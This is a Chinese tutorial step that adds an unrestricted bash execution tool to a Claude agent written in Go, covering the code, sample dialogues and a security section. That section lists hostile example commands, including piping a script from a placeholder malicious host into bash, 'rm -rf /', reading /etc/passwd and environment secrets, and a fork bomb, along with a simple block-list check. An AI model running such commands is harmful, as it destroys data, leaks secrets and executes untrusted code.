# 步骤 4：命令执行

## 学习目标

- 理解命令执行工具的实现方式
- 掌握安全执行 Shell 命令的方法
- 学习标准输出和标准错误的处理
- 了解命令失败时的错误捕获机制
- 认识命令执行工具的安全风险

## 背景知识

到目前为止，Claude 可以读取文件和列出目录。但有些任务需要执行命令，比如：
- 编译代码：`go build`
- 运行测试：`go test`
- 查看 Git 状态：`git status`
- 搜索文本：`grep pattern file`

在这一步中，我们将添加 `bash` 工具，让 Claude 能够执行 Shell 命令。

### 安全警告 ⚠️

命令执行工具非常强大，但也很危险：
- Claude 可以执行任何命令
- 恶意或错误的命令可能损坏系统
- 需要谨慎使用和监控

**在生产环境中**，应该：
- 限制可执行的命令
- 添加命令白名单
- 实现权限检查
- 记录所有命令执行
- 考虑使用沙箱环境

本教程的实现是为了学习，**不适合直接用于生产**。

## 实现步骤

### 1. 新增导入

```go
import (
	// ... 之前的导入 ...
	"os/exec"
)
```

- `os/exec`：执行外部命令的标准库

### 2. Bash 工具定义

```go
var BashDefinition = ToolDefinition{
	Name:        "bash",
	Description: "Execute a bash command and return its output. Use this to run shell commands.",
	InputSchema: BashInputSchema,
	Function:    Bash,
}
```

**Description 要点**：
- 简洁明了地说明功能
- 不需要过多细节，Claude 知道如何使用 bash

### 3. 输入参数定义

```go
type BashInput struct {
	Command string `json:"command" jsonschema_description:"The bash command to execute."`
}

var BashInputSchema = GenerateSchema[BashInput]()
```

只需要一个参数：要执行的命令字符串。

### 4. Bash 工具实现

```go
func Bash(input json.RawMessage) (string, error) {
	bashInput := BashInput{}
	err := json.Unmarshal(input, &bashInput)
	if err != nil {
		return "", err
	}

	log.Printf("Executing bash command: %s", bashInput.Command)
	
	// 使用 bash -c 执行命令
	cmd := exec.Command("bash", "-c", bashInput.Command)
	
	// 捕获标准输出和标准错误
	output, err := cmd.CombinedOutput()
	
	if err != nil {
		log.Printf("Bash command failed: %s, error: %v", bashInput.Command, err)
		// 即使命令失败，也返回输出（可能包含错误信息）
		return fmt.Sprintf("Command failed with error: %s\nOutput: %s", 
			err.Error(), string(output)), nil
	}

	log.Printf("Bash command succeeded: %s (output: %d bytes)", 
		bashInput.Command, len(output))
	return strings.TrimSpace(string(output)), nil
}
```


### 5. 注册工具

```go
func main() {
	// ... 之前的代码 ...

	tools := []ToolDefinition{
		ReadFileDefinition, 
		ListFilesDefinition, 
		BashDefinition,
	}
	if *verbose {
		log.Printf("Initialized %d tools", len(tools))
	}
	agent := NewAgent(&client, getUserMessage, tools, *verbose)
	err := agent.Run(context.TODO())
	if err != nil {
		fmt.Printf("Error: %s\n", err.Error())
	}
}
```

现在工具列表包含三个工具。

## 运行和测试

### 编译和运行

```bash
# 基本运行
go run bash_tool.go

# 启用详细日志
go run bash_tool.go --verbose
```

### 示例对话 1：查看 Git 状态

```
Chat with Claude (use 'ctrl-c' to quit)
You: 这个项目的 Git 状态如何？
tool: bash({"command":"git status"})
result: On branch main
Your branch is up to date with 'origin/main'.

nothing to commit, working tree clean
Claude: 项目的 Git 状态很好：
- 当前在 main 分支
- 与远程仓库同步
- 工作目录干净，没有未提交的更改
```

### 示例对话 2：编译项目

```
You: 请编译这个项目
tool: bash({"command":"go build"})
result: 
Claude: 项目编译成功！没有错误或警告。
```

### 示例对话 3：运行测试

```
You: 运行所有测试
tool: bash({"command":"go test ./..."})
result: ?   	github.com/example/workshop	[no test files]
Claude: 项目中还没有测试文件。建议添加测试来确保代码质量。
```

### 示例对话 4：命令失败处理

```
You: 列出不存在的目录
tool: bash({"command":"ls /nonexistent"})
result: Command failed with error: exit status 2
Output: ls: /nonexistent: No such file or directory
Claude: 命令执行失败。目录 /nonexistent 不存在。
```

### 示例对话 5：工具组合使用

```
You: 找出所有 Go 文件并统计代码行数
tool: list_files({})
result: ["chat.go","read.go","list_files.go","bash_tool.go"]
tool: bash({"command":"wc -l *.go"})
result:   150 chat.go
  250 read.go
  280 list_files.go
  320 bash_tool.go
 1000 total
Claude: 项目包含 4 个 Go 源文件，总共约 1000 行代码：
- chat.go: 150 行
- read.go: 250 行
- list_files.go: 280 行
- bash_tool.go: 320 行
```

## 代码解析

### 核心概念

#### 1. exec.Command 函数

```go
cmd := exec.Command("bash", "-c", bashInput.Command)
```

创建一个命令对象：
- 第一个参数：要执行的程序（`bash`）
- 后续参数：传递给程序的参数
- `-c`：告诉 bash 执行后面的字符串作为命令

**为什么使用 `bash -c`？**
- 支持管道、重定向等 Shell 特性
- 可以执行复杂的命令组合
- 与用户在终端中的体验一致

#### 2. CombinedOutput 方法

```go
output, err := cmd.CombinedOutput()
```

`CombinedOutput` 的特点：
- 同时捕获标准输出（stdout）和标准错误（stderr）
- 等待命令完成
- 返回合并的输出和可能的错误

**替代方案**：
- `cmd.Output()`：只捕获 stdout
- `cmd.Run()`：不捕获输出
- `cmd.Start()` + `cmd.Wait()`：异步执行

#### 3. 错误处理策略

```go
if err != nil {
	return fmt.Sprintf("Command failed with error: %s\nOutput: %s", 
		err.Error(), string(output)), nil
}
```

**关键设计决策**：即使命令失败，也返回 `nil` 错误。

**为什么？**
- 命令失败是"正常"的结果（如文件不存在）
- 我们想让 Claude 看到错误信息并解释给用户
- 如果返回 Go 错误，Claude 只会看到 "tool execution failed"

**什么时候应该返回错误？**
- 无法解析输入参数
- 无法启动命令（如 bash 不存在）
- 系统级错误

#### 4. 输出处理

```go
return strings.TrimSpace(string(output)), nil
```

`TrimSpace` 移除首尾空白：
- 命令输出通常有尾随换行符
- 清理后的输出更整洁
- 便于 Claude 处理

### 关键代码段分析

#### 命令构建

```go
cmd := exec.Command("bash", "-c", bashInput.Command)
```

这等价于在终端执行：
```bash
bash -c "your command here"
```

**安全考虑**：
- 用户输入直接传递给 bash
- 可能包含恶意命令（如 `rm -rf /`）
- 生产环境需要添加验证和限制

#### 输出捕获

```go
output, err := cmd.CombinedOutput()
```

`CombinedOutput` 内部做了什么：
1. 创建管道捕获 stdout 和 stderr
2. 启动命令
3. 读取所有输出
4. 等待命令完成
5. 返回输出和退出状态

#### 错误信息格式化

```go
return fmt.Sprintf("Command failed with error: %s\nOutput: %s", 
	err.Error(), string(output)), nil
```

提供完整的错误上下文：
- 错误类型（如 "exit status 1"）
- 命令的实际输出（可能包含错误详情）
- Claude 可以根据这些信息给出有用的建议

### 为什么这样设计？

**问：为什么不直接使用 `os/exec` 执行命令，而要通过 bash？**
答：
- 支持 Shell 特性（管道、重定向、变量等）
- 用户可以使用熟悉的 Shell 语法
- 可以执行复杂的命令组合

**问：为什么合并 stdout 和 stderr？**
答：
- 简化处理逻辑
- 保持输出顺序
- 错误信息通常对理解输出很重要

**问：命令超时怎么办？**
答：当前实现没有超时机制。可以使用 `context.WithTimeout`：
```go
ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
defer cancel()
cmd := exec.CommandContext(ctx, "bash", "-c", bashInput.Command)
```

**问：如何限制命令的资源使用？**
答：可以使用：
- `cmd.SysProcAttr`：设置进程属性（如 CPU、内存限制）
- cgroups：Linux 资源控制
- 容器：Docker、podman 等

## 安全考虑

### 潜在风险

1. **任意命令执行**
   ```bash
   rm -rf /  # 删除所有文件
   curl malicious.com/script.sh | bash  # 执行恶意脚本
   ```

2. **信息泄露**
   ```bash
   cat /etc/passwd  # 读取敏感文件
   env  # 查看环境变量（可能包含密钥）
   ```

3. **资源耗尽**
   ```bash
   :(){ :|:& };:  # Fork 炸弹
   dd if=/dev/zero of=/dev/null  # 消耗 CPU
   ```

### 缓解措施

1. **命令白名单**
   ```go
   allowedCommands := map[string]bool{
       "git": true,
       "ls": true,
       "cat": true,
   }
   
   // 检查命令是否在白名单中
   ```

2. **参数验证**
   ```go
   // 禁止某些危险字符
   if strings.Contains(command, "rm -rf") {
       return "", fmt.Errorf("dangerous command detected")
   }
   ```

3. **沙箱执行**
   - 使用 Docker 容器
   - 使用 chroot
   - 使用专门的沙箱工具（如 firejail）

4. **权限限制**
   - 以低权限用户运行
   - 使用 SELinux 或 AppArmor
   - 限制文件系统访问

5. **审计日志**
   ```go
   log.Printf("User requested command: %s", command)
   // 记录到持久化存储
   ```

## 练习建议

1. **添加命令超时**：使用 `context.WithTimeout` 防止命令长时间运行

2. **实现命令白名单**：只允许执行预定义的安全命令

3. **分离 stdout 和 stderr**：
   ```go
   var stdout, stderr bytes.Buffer
   cmd.Stdout = &stdout
   cmd.Stderr = &stderr
   ```

4. **添加工作目录参数**：允许在指定目录执行命令
   ```go
   cmd.Dir = "/path/to/directory"
   ```

5. **实现命令历史**：记录所有执行的命令和结果

6. **添加交互式命令支持**：处理需要用户输入的命令（高级）

## 常见问题

### Q: 如何执行需要 sudo 的命令？

A: 不推荐。如果必须：
- 配置 sudoers 允许无密码执行特定命令
- 考虑使用专门的权限提升机制
- 评估安全风险

### Q: 可以执行后台命令吗？

A: 可以，但需要特殊处理：
```go
cmd.Start()  // 启动但不等待
// 保存 cmd 对象以便后续检查状态
```

### Q: 如何处理需要交互的命令？

A: 当前实现不支持。需要：
- 使用 `cmd.Stdin`、`cmd.Stdout`、`cmd.Stderr`
- 实现输入/输出的双向通信
- 考虑使用 pseudo-terminal (pty)

### Q: Windows 上如何工作？

A: 需要修改：
```go
// Windows 使用 cmd.exe
cmd := exec.Command("cmd", "/C", bashInput.Command)
```

或者使用跨平台的方法检测操作系统。

### Q: 命令输出太长怎么办？

A: 可以：
- 限制输出大小
- 截断输出
- 将输出保存到文件

```go
if len(output) > 10000 {
	output = output[:10000]
	output = append(output, []byte("\n... (truncated)")...)
}
```

### Q: 如何传递环境变量？

A: 使用 `cmd.Env`：
```go
cmd.Env = append(os.Environ(), "MY_VAR=value")
```

## 下一步

太棒了！现在 Claude 可以执行命令了，这大大扩展了它的能力。

在[步骤 5：文件编辑](step-5-edit.md)中，我们将添加 `edit_file` 工具，让 Claude 能够修改文件内容。这将引入字符串替换和文件创建的逻辑。

关键概念预告：
- 字符串查找和替换
- 文件创建和目录管理
- 原子性操作考虑
- 编辑冲突处理
